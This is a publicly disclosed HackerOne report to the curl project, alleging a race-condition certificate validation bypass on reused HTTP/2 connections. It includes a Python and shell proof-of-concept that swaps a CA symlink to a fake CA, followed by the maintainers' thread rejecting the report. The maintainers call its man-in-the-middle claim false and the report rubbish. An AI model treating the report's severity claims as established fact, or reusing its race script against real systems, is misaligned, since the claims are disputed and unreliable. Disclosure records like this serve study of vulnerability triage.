---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/time-of-check-time-of-use-toctou-race-condition
  - env/web
  - vuln/sql-injection
  - vuln/race-condition
  - trigger/race-window
substate: "not-applicable"
weakness: "Time-of-check Time-of-use (TOCTOU) Race Condition"
enriched: true
body: true
date: 2025-09-11
submitted: 2025-09-11T15:02:43.015Z
bounty_usd: null
votes: 23
cve: []
program: "[[programs/curl|curl]]"
reporter: "0xrey"
source: "https://hackerone.com/reports/3335085"
title: "TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass"
---
# TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 23 | **Program:** curl | **Disclosed:** 2025-09-11

- Report: [https://hackerone.com/reports/3335085](https://hackerone.com/reports/3335085)
- CWE: Time-of-check Time-of-use (TOCTOU) Race Condition
- Submitted: 2025-09-11T15:02:43.015Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections. During the initial handshake, `libcurl` correctly validates the server's certificate against the user-provided CA bundle. However, it then assumes this trust is permanent for the entire life of the connection.

If an attacker can modify the CA file on disk *after* this initial check, `libcurl` will continue to reuse the now-trusted connection for new HTTP/2 streams without ever re-validating its trust anchor. This allows an attacker to completely bypass certificate validation for all subsequent requests, enabling a full Man-in-the-Middle attack.

**Affected version:**

This vulnerability was confirmed on the latest stable release, **curl 8.16.0**, which I compiled from source to ensure the test was relevant. Given the nature of the bug, it likely affects all versions that support HTTP/2 connection reuse.

My test build's version output:
`curl 8.16.0 (x86_64-pc-linux-gnu) libcurl/8.16.0 OpenSSL/3.0.2 ... nghttp2/1.43.0`

**Steps To Reproduce:**

The following Proof of Concept demonstrates the vulnerability in a reliable way. It uses a Python script to orchestrate the test environment (compiling `curl`, setting up a server, and generating certificates) and then executes a small shell script to perform the actual attack.

**Step 1: Save and run the Proof of Concept code**
Save the code below as `poc.py` and run it with `python3 poc.py`. The script requires standard build tools (`build-essential`, etc.) and the `openssl` command-line tool.

```python
# Proof of Concept for Curl HTTP/2 TOCTOU Vulnerability
import threading, ssl, http.server, time, os, glob, sys, subprocess

def compile_curl():
    # Stage 1: Compile Curl 8.16.0 from source to ensure we test the latest version.
    print("--- STAGE 1: COMPILING CURL 8.16.0 ---")
    if os.path.exists("curl-8.16.0/src/curl"):
        print("Curl 8.16.0 already compiled.")
        return os.path.abspath("curl-8.16.0/src/curl")

    # Dependencies for Debian/Ubuntu can be installed with:
    # apt-get install -y build-essential libssl-dev libnghttp2-dev libpsl-dev
    
    subprocess.run("wget -q https://curl.se/download/curl-8.16.0.tar.gz && tar -xzf curl-8.16.0.tar.gz", shell=True, check=True)
    
    original_dir = os.getcwd()
    os.chdir("curl-8.16.0")
    print("\n--- Running ./configure ---")
    subprocess.run("./configure --with-openssl --with-nghttp2 > /dev/null", shell=True, check=True)
    print("--- Running make ---")
    subprocess.run("make > /dev/null", shell=True, check=True)
    
    curl_binary_path = os.path.abspath("src/curl")
    print("\n--- Verifying New Curl Version ---")
    subprocess.run(f"{curl_binary_path} --version", shell=True)
    os.chdir(original_dir)
    print("--- COMPILATION COMPLETE ---")
    return curl_binary_path

# Stage 2: Setup Server and Certificates
HOST = "localhost"
PORT = 8443
CA_FILE_PATH = "ca.crt"
SERVER_CERT_FILE = "server.crt"; SERVER_KEY_FILE = "server.key"
LEGIT_CA_CERT_FILE = "legit_ca.crt"; LEGIT_CA_KEY_FILE = "legit_ca.key"
FAKE_CA_CERT_FILE = "fake_ca.crt"; FAKE_CA_KEY_FILE = "fake_ca.key"

def cleanup_files():
    files_to_delete = glob.glob("*.crt") + glob.glob("*.key") + glob.glob("*.pem") + glob.glob("*.srl") + glob.glob("*.csr")
    for f in files_to_delete:
        try: os.remove(f)
        except: pass

def generate_all_certs():
    print("Generating certificates using OpenSSL CLI...")
    # Legit CA
    subprocess.run(f"openssl genrsa -out {LEGIT_CA_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -x509 -new -nodes -key {LEGIT_CA_KEY_FILE} -sha256 -days 365 -out {LEGIT_CA_CERT_FILE} -subj "/CN=Legit CA"', shell=True, check=True, capture_output=True)
    # Fake CA
    subprocess.run(f"openssl genrsa -out {FAKE_CA_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -x509 -new -nodes -key {FAKE_CA_KEY_FILE} -sha256 -days 365 -out {FAKE_CA_CERT_FILE} -subj "/CN=Fake CA"', shell=True, check=True, capture_output=True)
    # Server Cert (signed by Legit CA)
    subprocess.run(f"openssl genrsa -out {SERVER_KEY_FILE} 2048", shell=True, check=True, capture_output=True)
    subprocess.run(f'openssl req -new -key {SERVER_KEY_FILE} -out server.csr -subj "/CN={HOST}"', shell=True, check=True, capture_output=True)
    subprocess.run(f"openssl x509 -req -in server.csr -CA {LEGIT_CA_CERT_FILE} -CAkey {LEGIT_CA_KEY_FILE} -CAcreateserial -out {SERVER_CERT_FILE} -days 365 -sha256", shell=True, check=True, capture_output=True)
    print("Certificates created successfully.")

def run_server():
    class SimpleServer(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[SERVER LOG] Request received for: {self.path}")
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
        def log_message(self, format, *args):
            return # Suppress default logging

    print(f"[SERVER] Listening at https://{HOST}:{PORT}")
    httpd = http.server.HTTPServer((HOST, PORT), SimpleServer)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.set_alpn_protocols(['h2', 'http/1.1']) # Enable ALPN for HTTP/2 negotiation
    ctx.load_cert_chain(certfile=SERVER_CERT_FILE, keyfile=SERVER_KEY_FILE)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()

# --- Main Execution ---
try:
    CURL_BINARY_PATH = compile_curl()
    cleanup_files()
    generate_all_certs()

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    time.sleep(2)

    os.symlink(LEGIT_CA_CERT_FILE, CA_FILE_PATH)

    attack_script = f"""
    #!/bin/bash
    set -e
    echo -e "\\n--- STARTING ATTACK (Testing Curl 8.16.0) ---"

    # Attacker process: swap the symlink after a short delay
    (
      sleep 0.5
      echo "[ATTACKER] Swapping symlink to Fake CA!"
      rm -f {CA_FILE_PATH}
      ln -s {FAKE_CA_CERT_FILE} {CA_FILE_PATH}
    ) &

    # Victim process: curl with two requests, forcing HTTP/2
    {CURL_BINARY_PATH} --http2 -v \\
      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data1 \\
      --cacert {CA_FILE_PATH} https://{HOST}:{PORT}/secure/data2
    """

    with open("attack.sh","w") as f:
        f.write(attack_script)
    os.chmod("attack.sh", 0o755)

    print("\n--- Running Attack against Curl 8.16.0 ---")
    subprocess.run("./attack.sh", shell=True)

    print("\n--- Final Analysis ---")
    print("Review the output above. If the curl command succeeded and the server log shows two requests, the bug is confirmed in 8.16.0.")

except Exception as e:
    print(f"An error occurred: {e}")
    print("Please ensure build tools (build-essential, etc.) and OpenSSL CLI are installed.")
```

**Step 2: Observe the output**
The script orchestrates a race condition:
a. It creates a symlink `ca.crt` pointing to a legitimate CA file.
b. It launches a background process that, after a brief pause, atomically replaces this symlink to point to a fake CA file.
c. It immediately runs a single `curl` command that makes two requests over HTTP/2, forcing connection reuse.

**Expected (Secure) Behavior:**
The first request should succeed. The second request, however, should fail with an SSL certificate verification error (exit code 60). A secure implementation would either re-evaluate the trust anchor for the new stream or create a new connection which would then fail validation against the swapped-in fake CA.

**Actual (Vulnerable) Behavior:**
Both requests succeed. The `curl` command exits cleanly. The verbose output explicitly shows `Re-using existing connection!`, and the server log confirms both requests were received. This is definitive proof that `curl` does not re-validate the trust anchor for the second stream, instead blindly sending it over the previously established trusted connection.

## Impact

This vulnerability allows a local attacker to completely bypass TLS certificate validation for all but the first request on a long-lived HTTP/2 connection. This breaks the trust model of TLS and enables Man-in-the-Middle (MitM) attacks, compromising the confidentiality and integrity of sensitive data.

I've rated this as **High** severity. While the attack vector is local, the impact is a catastrophic failure of TLS guarantees (full MitM). The "local" prerequisite is met in many common, real-world scenarios beyond a simple desktop user, such as:
*   Multi-tenant servers and shared hosting environments.
*   Compromised container environments with shared volumes.
*   Applications that insecurely use world-writable directories like `/tmp` for trust stores.
*   As a powerful escalation step in a vulnerability chain, where a lower-impact bug (like a limited file write) can be escalated to a full network MitM.

The impact is most severe for long-running applications, daemons, or API clients that rely on persistent HTTP/2 connections, as the window of opportunity for the attacker is indefinite after the first connection is made.

## Timeline

- **Report Filed**
- **2025-09-11** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-09-11** @bagder: This is curl working as intended. We can possibly consider improving the documentation to make this more obvious to users.

Also, this is not HTTP/2 specific. curl works the same for all TLS-using protocols it supports and will reuse an existing connection if one exists - without verifying the certificate again.
- **2025-09-11** @0xrey: Hi Daniel,,
Thank you for the quick response and clarification.

I understand this is the current intended design. However, I believe this design creates a security vulnerability by violating the user's trust model. It's a classic TOCTOU race condition: the check on the --cacert file happens at a different time than its subsequent use via the reused connection.

This could be mitigated with a low-cost stat() check on the CA file before reusing a connection. If the file has changed, the connection should be dropped. This would be far more secure than a documentation update.

The risk of this escalating into a full Man-in-the-Middle attack in common scenarios (like shared hosting) is significant. I would ask you to please reconsider classifying this as a security issue that warrants a code fix.

Thanks for your time and consideration.

Best regards,
0xrey
- **2025-09-11** @bagder: There are many ways a CA store can be used, one external file is just one way so that would not cover all the cases. An application that is worried about this property can itself easily take counter-measures similar to this for example.

> The risk of this escalating into a full Man-in-the-Middle attack

Please elaborate exactly how this can be used to do a MITM attack.
- **2025-09-11** @icing: Not to mention the Denial-of-Service attack vector by someone being able to touch that file every second...

This is a question of security requirements outside of curl/libcurl. If you want to design a service/system using libcurl that drops all connections on some external event, like a change ca file, you are free to do so.
- **2025-09-11** @bagder: > This breaks the trust model of TLS and enables Man-in-the-Middle (MitM) attacks

This claim is false. It does not *break the trust model*. This behavior is on the contrary standard among TLS-using clients. Including browsers.
- **2025-09-11** @0xrey: Hi Daniel,

You've got a good point that a `stat()` on just `CURLOPT_CAINFO` wouldn't be a silver bullet for every possible trust store setup. I see that. Still, it would lock down what is probably the most common way people use it, which feels like a big win for security.

And while it's true that a determined developer could add these checks themselves, I feel like that's asking a lot. Most of us using `libcurl` just assume that if a connection is verified once, it's good to go. The current behavior is surprising, and when security behaviors are surprising, people make mistakes. Making `libcurl` safe by default here seems like the right path.

> Please elaborate exactly how this can be used to do a MITM attack.

Absolutely. The clearest way to see the danger is as a **persistence attack that sets up a future hijack.**

Imagine a long-running daemon that uses `libcurl` with HTTP/2. It's been running for days, happily reusing a perfectly valid connection to `api.example.com`.

Here's how the attack plays out:

1.  **The Breach:** An attacker finds some other minor bug that gives them temporary write access to the directory where the app's `ca.crt` symlink lives.
2.  **The Plant:** The attacker doesn't need to do much. They just atomically swap the `ca.crt` symlink to point to their own malicious CA file. Their job is done in a split second, and they might lose their access right after.
3.  **The Trap is Set:** The running daemon is completely unaware. It continues to reuse its old, valid connection, and everything looks fine.
4.  **The Hijack:** Days or weeks later, a network glitch happens, the server restarts, or anything forces the daemon to drop its connection. It naturally tries to reconnect to `api.example.com`.
    *   This time, when `libcurl` goes to validate the new connection, it follows the symlink and reads the **attacker's fake CA**.
    *   The attacker, who has been patiently waiting and poisoning DNS, presents their own server.
    *   `libcurl` sees a certificate signed by a CA it now trusts. The connection succeeds.

From that moment on, the daemon has a persistent, MitM'd connection to the attacker, and all its data is compromised until the next restart.

The core problem is that an attacker can silently poison the application's trust anchor, and `libcurl` has no idea. A quick, low-cost `stat()` check would spot the tampering and prevent this entire scenario.
- **2025-09-11** @dfandrich: See also the related issue https://hackerone.com/reports/2369299 on connection use after certificate expiry.
- **2025-09-11** @bagder: > The attacker doesn't need to do much. They just atomically swap the ca.crt symlink to point to their own malicious CA file

This assumes you have a local attacker with file system access to private or system files. That's already game over and such an attacker can do much worse attacks than this. This is not a threat vector curl can protect itself against.

Also, if the attacker can replace the CA store then the problem is not really related to persistent connections. The problem is that there is a malicious CA store in place because there is a local attacker in the system.

This is not a curl security problem.
- **2025-09-11** @bagder: > A quick, low-cost stat() check would spot the tampering and prevent this entire scenario.

No it wouldn't. In your described scenario the attacker has planted a malicious CA store, so when the client retries the connection with the new CA certs that were updated, the connection will succeed - because it then uses the malicious CA bundle.

Let's stop this boring game now. This is not a curl problem.
- **Report Not Applicable**
- **2025-09-11** @0xrey: Hi Daniel,

You're right about the `stat()` mitigation's flaw. Thank you for that insight.

Let's set aside the specific MitM scenario for a moment and focus on the core behavior, because that's where the bug lies.

Right now, `curl` allows this to happen:
1.  An application sends a request at T=1. It successfully connects to **Server A (the real server)**.
2.  The CA file is swapped on disk.
3.  The same application sends another request at T=2 using a reused connection. It still successfully talks to **Server A**.
4.  The connection drops. The application sends a third request at T=3. It now successfully connects to **Server B (the attacker's server)**.

From the application's perspective, it performed three identical operations but was connected to **two completely different endpoints**. `libcurl`, as the transport layer, silently allowed the application's fundamental trust anchor to be pulled from under it without any warning, error, or notification.

This profound behavioral inconsistency, connecting to different destinations based on hidden, internal caching states—is the security vulnerability. It violates the principle of least surprise and breaks the implicit trust contract between the application and the library.

This isn't about whether an attacker is "game over"; it's about whether `libcurl` behaves predictably and safely. In this case, it does not.

Best regards,
0xrey
- **2025-09-11** @bagder: This user is completely in the hands of the attacker. Since the CA bundle can be changed at will, that attacker can MITM every TLS using tool on that machine. For added fun the attacker would also updated /etc/hosts. This is completely unrelated to reused connections.

Again, not a curl security problem. This discussion is over. Further: I strongly suspect you're using AI to keep this nonsense going and that just adds injury to this case.
- **Agreed On Going Public**
- **Manually Disclosed**
- **2025-09-12** @0xrey: Hi team,

I noticed commit c184f46 was recently pushed, which changes the default connection lifetime to 24 hours. The commit message explicitly states, 'This makes the TLS certificate check get redone for the new connection.'

This change directly mitigates the core issue raised in this report. While I understand your classification of the report, I'm glad to see that the underlying risk was addressed. Thank you for making curl more secure.

Best regards,
0xrey
- **2025-09-12** @bagder: You consistently insisted the attacker can replace the CA cert bundle and **THAT** is then the issue in your report. You never spoke about or mentioned a problem with a TLS connection going on for longer than the CA cert would allow it. That idea came back to me because I reread the *other* report linked to above.

So no, my fix did nothing to address anything in your report. Your report was pure rubbish. If you comment again in this report I will ban you from this project.
- **Comments Closed**
